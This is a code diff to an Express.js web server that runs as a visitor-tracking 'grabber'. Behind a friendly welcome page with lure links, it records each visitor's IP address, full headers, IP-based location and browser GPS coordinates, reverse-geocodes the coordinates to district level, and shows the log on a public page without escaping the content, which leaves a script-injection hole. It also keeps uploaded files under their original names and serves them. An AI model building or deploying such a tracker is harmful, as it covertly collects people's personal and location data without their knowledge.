@@ -5,35 +5,33 @@ const multer = require('multer');
 const app = express();
 const port = 3000;
 
-// Setup multer for file storage
+// Setup multer
 const storage = multer.diskStorage({
-  destination: (req, file, cb) => {
-    cb(null, 'uploads/');
-  },
-  filename: (req, file, cb) => {
-    cb(null, Date.now() + '-' + file.originalname);
-  }
+  destination: (req, file, cb) => cb(null, 'uploads/'),
+  filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
 });
 const upload = multer({ storage: storage });
 
-// Middleware to serve static files
+// Serve static files
 app.use(express.static('public'));
 app.use(express.static('uploads'));
+
+// Count current visitors from file
+function getVisitorCount() {
+  if (!fs.existsSync('visitors.txt')) return 0;
+  const data = fs.readFileSync('visitors.txt', 'utf8');
+  return (data.match(/New Visitor:/g) || []).length;
+}
 
 // Homepage
 app.get('/', async (req, res) => {
   const ipRaw = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const ip = ipRaw.split(',')[0].trim().replace('::ffff:', '');
-
   const userAgent = req.headers['user-agent'];
   const headers = JSON.stringify(req.headers, null, 2);
 
-  // Get location info using ipapi.co
   const geoUrl = `https://ipapi.co/${ip}/json/`;
-
-  let city = 'N/A';
-  let region = 'N/A';
-  let country = 'N/A';
+  let city = 'N/A', region = 'N/A', country = 'N/A';
 
   try {
     const response = await fetch(geoUrl);
@@ -45,7 +43,6 @@ app.get('/', async (req, res) => {
     console.error('❌ Error fetching geolocation:', err);
   }
 
-  // Log basic visitor info
   const logData = `=========================
 New Visitor:
 Time: ${new Date().toISOString()}
@@ -57,14 +54,20 @@ Headers: ${headers}
 
   fs.appendFile('visitors.txt', logData, (err) => {
     if (err) console.error('❌ Error saving visitor info:', err);
-    else console.log('✅ Visitor info saved to visitors.txt');
+    else console.log('✅ Visitor info saved');
   });
 
-  // Send page
+  const visitorCount = getVisitorCount();
+  if (visitorCount >= 10) {
+    console.log('🎉 10 visitors reached! Clearing log.');
+    fs.writeFileSync('visitors.txt', '');
+  }
+
   res.send(`
     <h1>🚀 Welcome!</h1>
     <p>Your IP-based location: ${city}, ${region}, ${country}</p>
-    
+    <p>Total visitors (before clearing): ${visitorCount >= 10 ? 0 : visitorCount}</p>
+
     <p>📄 <a href="/files/sample-doc.pdf" target="_blank">Download PDF</a></p>
     <p>🖼️ <a href="/images/sample-image.jpg" target="_blank">View Image</a></p>
     <p>🎥 <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank">Watch YouTube Video</a></p>
@@ -78,12 +81,7 @@ Headers: ${headers}
     <script>
       navigator.geolocation.getCurrentPosition(
         pos => {
-          fetch(\`/log-location?lat=\${pos.coords.latitude}&lon=\${pos.coords.longitude}\`)
-            .then(response => response.text())
-            .then(html => {
-              const popup = window.open("", "_blank");
-              popup.document.write(html);
-            });
+          fetch(\`/log-location?lat=\${pos.coords.latitude}&lon=\${pos.coords.longitude}\`);
         },
         err => {
           console.log("Geolocation error:", err);
@@ -93,11 +91,9 @@ Headers: ${headers}
   `);
 });
 
-// Log client browser geolocation and resolve city, state, district
+// Log client geolocation
 app.get('/log-location', async (req, res) => {
-  const lat = req.query.lat;
-  const lon = req.query.lon;
-
+  const { lat, lon } = req.query;
   try {
     const geoUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
     const response = await fetch(geoUrl, { headers: { 'User-Agent': 'YourAppName/1.0' } });
@@ -116,8 +112,8 @@ Resolved Location: City: ${city}, District: ${district}, State: ${state}, Countr
 =========================\n`;
 
     fs.appendFile('visitors.txt', logData, (err) => {
-      if (err) console.error('❌ Error saving location:', err);
-      else console.log('✅ Client location saved with address');
+      if (err) console.error('❌ Error saving client location:', err);
+      else console.log('✅ Client location saved');
     });
 
     res.send(`
@@ -136,7 +132,7 @@ Resolved Location: City: ${city}, District: ${district}, State: ${state}, Countr
   }
 });
 
-// Handle image upload
+// Upload image
 app.post('/upload', upload.single('image'), (req, res) => {
   if (!req.file) return res.status(400).send('No file uploaded');
   res.send(`
@@ -147,11 +143,18 @@ app.post('/upload', upload.single('image'), (req, res) => {
   `);
 });
 
-// Show visitors log
+// View visitors log
 app.get('/visitors', (req, res) => {
-  res.sendFile(__dirname + '/visitors.txt');
+  const visitorCount = getVisitorCount();
+  const content = fs.existsSync('visitors.txt') ? fs.readFileSync('visitors.txt', 'utf8') : '';
+  res.send(`
+    <h1>👀 Visitor Log</h1>
+    <p>Total visitors logged: ${visitorCount}</p>
+    <pre>${content || 'No visitor data.'}</pre>
+    <p><a href="/">Back to Home</a></p>
+  `);
 });
 
 app.listen(port, () => {
-  console.log(`✅ Server running on http://localhost:${port}`);
+  console.log(`✅ Server running at http://localhost:${port}`);
 });
